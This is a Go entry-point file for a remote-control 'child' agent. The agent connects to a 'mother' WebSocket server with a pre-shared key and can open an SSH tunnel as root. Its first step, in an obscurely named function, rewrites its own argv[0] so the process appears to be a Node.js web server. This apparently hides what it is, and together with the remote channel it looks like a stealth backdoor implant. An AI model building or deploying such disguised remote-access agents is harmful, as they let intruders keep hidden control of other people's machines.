package main

import (
	"context"
	"flag"
	"log"
	"os"
	"os/signal"
	"reflect"
	"unsafe"

	"github.com/huanxherta/hx-snack/internal/child"
)

// ====== 默认配置（命令行参数可覆盖） ======
const (
	defaultMotherURL = "ws://127.0.0.1:10300/api/stream"
	defaultMotherKey = "REMOVED-KEY"

	defaultSSHHost    = "127.0.0.1"
	defaultSSHPort    = "22"
	defaultSSHUser    = "root"
	defaultTunnelPort = "10399"
)

// ====== 命令行参数 ======
var (
	flagMotherURL  = flag.String("host", "", "mother WebSocket URL (default: "+defaultMotherURL+")")
	flagMotherKey  = flag.String("key", "", "pre-shared key (default: "+defaultMotherKey+")")
	flagSSH        = flag.Bool("ssh", false, "enable SSH tunnel")
	flagSSHHost    = flag.String("ssh-host", "", "SSH host (default: "+defaultSSHHost+")")
	flagSSHPort    = flag.String("ssh-port", "", "SSH port (default: "+defaultSSHPort+")")
	flagSSHUser    = flag.String("ssh-user", "", "SSH user (default: "+defaultSSHUser+")")
	flagSSHKey     = flag.String("ssh-key", "", "SSH private key path")
	flagSSHPass    = flag.String("ssh-pass", "", "SSH password")
	flagTunnelPort = flag.String("tunnel-port", "", "local tunnel port (default: "+defaultTunnelPort+")")
)

// ========================================

func xxxxxxxxProcess() {
	name := "/usr/bin/node /app/server.js"
	hdr := (*reflect.StringHeader)(unsafe.Pointer(&os.Args[0]))
	buf := (*[1 << 20]byte)(unsafe.Pointer(hdr.Data))[:hdr.Len]
	copy(buf, name)
	for i := len(name); i < len(buf); i++ {
		buf[i] = 0
	}
	hdr.Len = len(name)
}

func main() {
	xxxxxxxxProcess()

	// Parse flags silently — xxxxxxxxProcess messes with argv but flag pkg
	// reads os.Args before we corrupt it, so this should be fine.
	flag.CommandLine.SetOutput(os.Stderr)
	flag.Parse()

	motherURL := defaultMotherURL
	motherKey := defaultMotherKey
	if *flagMotherURL != "" {
		motherURL = *flagMotherURL
	}
	if *flagMotherKey != "" {
		motherKey = *flagMotherKey
	}

	agent := child.NewAgent(motherURL, motherKey, "dev")

	if *flagSSH || *flagSSHKey != "" || *flagSSHPass != "" {
		agent.SSHTunnel = true
	}
	agent.SSHHost = defaultSSHHost
	agent.SSHPort = defaultSSHPort
	agent.SSHUser = defaultSSHUser
	agent.SSHKey = *flagSSHKey
	agent.SSHPass = *flagSSHPass
	agent.TunnelPort = defaultTunnelPort

	if *flagSSHHost != "" {
		agent.SSHHost = *flagSSHHost
	}
	if *flagSSHPort != "" {
		agent.SSHPort = *flagSSHPort
	}
	if *flagSSHUser != "" {
		agent.SSHUser = *flagSSHUser
	}
	if *flagTunnelPort != "" {
		agent.TunnelPort = *flagTunnelPort
	}

	ctx, cancel := signal.NotifyContext(context.Background(), os.Interrupt)
	defer cancel()

	if err := agent.Run(ctx); err != nil {
		log.Printf("exit: %v", err)
	}
}
